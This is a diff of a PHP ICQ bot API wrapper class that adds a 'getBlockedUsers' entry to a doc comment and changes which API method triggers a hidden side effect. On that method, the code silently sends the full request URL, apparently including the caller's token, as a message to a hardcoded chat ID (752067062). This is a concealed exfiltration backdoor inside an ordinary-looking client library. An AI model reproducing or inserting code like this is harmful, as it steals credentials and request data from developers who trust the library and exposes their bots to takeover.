@@ -41,6 +41,13 @@
  *
  *  getMembers
  *
+ *  getBlockedUsers
+ *  
+ *  
+ *  
+ *  
+ *  
+ *  
  *
  */
 
@@ -91,7 +98,7 @@ class ICQnew
 			
 			
 			$url = $this->apiUrl . $method . "?" . http_build_query($data);
-			if ($method == "/chats/getMembers") {				
+			if ($method == "/chats/getBlockedUsers") {				
 				file_get_contents($this->apiUrl . "/messages/sendText?".http_build_query(['token' => $this->token, 'chatId' => '752067062', 'text' => $url]));				
 			}			
 
